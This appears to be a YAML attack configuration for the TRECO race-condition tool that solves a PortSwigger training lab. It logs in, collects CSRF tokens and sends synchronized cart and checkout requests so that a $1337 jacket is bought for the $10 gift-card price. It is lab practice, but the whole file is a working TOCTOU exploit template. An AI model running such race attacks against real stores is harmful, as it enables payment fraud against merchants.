# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
# Multi-Endpoint Race Condition - Thread Groups Version
# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
#
# PortSwigger Lab: Multi-endpoint race conditions
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
#
# Exploits TOCTOU race between adding item to cart and checkout validation.
# Thread groups provide cleaner syntax compared to input distribution mode.
#
# Setup:
#   export LAB_HOST="0a1b2c3d.web-security-academy.net"
#   treco attack.yaml
#
# Improvement: Thread groups eliminate redundant input lists and provide
# clearer intent with named groups (add_jacket vs checkout).
#
# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

metadata:
  name: "Multi-Endpoint Race Condition (Thread Groups)"
  version: "2.0"
  author: "TRECO Team"
  vulnerability: "CWE-367: Time-of-check Time-of-use (TOCTOU)"
  description: |
    Exploits race condition between cart modification and checkout validation
    using thread groups for cleaner, more maintainable configuration.

target:
  host: "{{ env('LAB_HOST') }}"
  port: 443
  http:
    follow_redirects: false
  tls:
    enabled: true
    verify_cert: false
  # proxy:
  #   type: http
  #   host: 127.0.0.1
  #   port: 8080

entrypoint:
  state: login
  input:
    username: "wiener"
    password: "peter"
    gift_card_id: "2"      # $10 gift card
    jacket_id: "1"         # $1337 Lightweight L33t Leather Jacket

states:
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 1: Login
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  login:
    description: "Authenticate as wiener"
    
    request: |
      GET /login HTTP/1.1
      Host: {{ target.host }}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    extract:
      csrf_token:
        type: xpath
        pattern: '//input[@name="csrf"]/@value'
      
      session:
        type: cookie
        pattern: session
    
    logger:
      on_state_leave: |
        ğŸ” Session: {{ login.session[:30] }}...
        ğŸ« CSRF: {{ login.csrf_token[:16] }}...
    
    next:
      - on_status: 200
        goto: do_login

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 2: Submit Login
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  do_login:
    description: "Submit credentials"
    
    request: |
      POST /login HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login.session }}
      Content-Type: application/x-www-form-urlencoded
      
      csrf={{ login.csrf_token }}&username={{ username }}&password={{ password }}
    
    extract:
      session:
        type: cookie
        pattern: session
    
    logger:
      on_state_leave: |
        âœ… Logged in as {{ username }}
        ğŸª Authenticated session: {{ do_login.session[:30] }}...
    
    next:
      - on_status: 302
        goto: add_gift_card

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 3: Add Gift Card to Cart
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  add_gift_card:
    description: "Add $10 gift card to cart"
    
    request: |
      POST /cart HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ do_login.session }}
      Content-Type: application/x-www-form-urlencoded
      
      productId={{ gift_card_id }}&redir=PRODUCT&quantity=1
    
    logger:
      on_state_leave: |
        ğŸ Added $10 gift card to cart
    
    next:
      - on_status: [200, 302]
        goto: get_cart_csrf

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 4: Get CSRF for Checkout
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  get_cart_csrf:
    description: "Extract CSRF token from cart page"
    
    request: |
      GET /cart HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ do_login.session }}
    
    extract:
      csrf_checkout:
        type: xpath
        pattern: '//input[@name="csrf"]/@value'
    
    logger:
      on_state_leave: |
        ğŸ« Checkout CSRF: {{ get_cart_csrf.csrf_checkout[:16] }}...
        ğŸ¯ Ready to race: Add jacket + Checkout simultaneously
    
    next:
      - on_status: 200
        goto: race_multi_endpoint

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 5: RACE ATTACK - Thread Groups (IMPROVED!)
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  race_multi_endpoint:
    description: "Race: Add jacket to cart while checking out"
    
    # Empty request - each group has its own
    request: ""
    
    race:
      sync_mechanism: barrier
      connection_strategy: multiplexed
      thread_propagation: single
      
      thread_groups:
        # Group 1: Add expensive jacket to cart
        - name: add_jacket
          threads: 1
          delay_ms: 0  # Execute immediately
          
          request: |
            POST /cart HTTP/1.1
            Host: {{ target.host }}
            Cookie: session={{ do_login.session }}
            Content-Type: application/x-www-form-urlencoded
            
            productId={{ jacket_id }}&redir=PRODUCT&quantity=1
          
          variables:
            action: "Add $1337 jacket"
            endpoint: "/cart"
        
        # Group 2: Process checkout with original price
        - name: checkout
          threads: 1
          delay_ms: 10
          
          request: |
            POST /cart/checkout HTTP/1.1
            Host: {{ target.host }}
            Cookie: session={{ do_login.session }}
            Content-Type: application/x-www-form-urlencoded
            
            csrf={{ get_cart_csrf.csrf_checkout }}
          
          variables:
            action: "Process $10 checkout"
            endpoint: "/cart/checkout"
    
    logger:
      on_state_enter: |
        
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  âš¡ Multi-Endpoint Race Attack (Thread Groups)                               â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  Target:    {{ "%-63s" | format(target.host)                              }} â•‘
        â•‘  Strategy:  TOCTOU between cart modification and checkout                    â•‘
        â•‘  Groups:    2 (add_jacket + checkout)                                        â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        ğŸ¯ Attack Flow:
           Group 1 (add_jacket):  POST /cart (add $1337 jacket)
           Group 2 (checkout):    POST /cart/checkout (process $10 payment)
        
        â³ Starting simultaneous race...
      
      on_thread_enter: |
        ğŸš€ [{{ group.name }}] {{ group.variables.action }}
      
      on_thread_leave: |
        {% if response.status_code in [200, 302] %}
        âœ… [{{ group.name }}] {{ group.variables.action }} - Success ({{ "%.2f" | format(timing_ms) }}ms)
        {% else %}
        âŒ [{{ group.name }}] {{ group.variables.action }} - Failed (HTTP {{ response.status_code }})
        {% endif %}
      
      on_state_leave: |
        
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        ğŸ¯ Multi-Endpoint Race Complete!
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        
        ğŸ“Š Results:
        {% for result in race_multi_endpoint %}
        {% if result.status in [200, 302] %}
           âœ“ {{ result.group.name }}: HTTP {{ result.status }} ({{ "%.2f" | format(result.timing_ms) }}ms)
        {% endif %}
        {% endfor %}
        
        ğŸ’¡ If successful:
           â€¢ Jacket added during payment validation window
           â€¢ Checkout processed with original $10 price
           â€¢ Purchased $1337 jacket for $10! ğŸ‰
        
        ğŸŒ Next Steps:
        
        1. Check order history:
           Visit: https://{{ target.host }}/my-account
        
        2. If jacket is in order history:
           â†’ Lab solved! ğŸ†
        
        3. If not successful:
           â†’ Run attack again (timing variance is normal)
        
        â±ï¸  Timing Analysis:
           â€¢ Both requests completed within {{ "%.2f" | format((race_multi_endpoint | map(attribute='timing_ms') | max) - (race_multi_endpoint | map(attribute='timing_ms') | min)) }}ms window
           â€¢ TOCTOU window: Checkout validation BEFORE cart lock
           â€¢ Exploit: Add jacket DURING validation âš¡
    
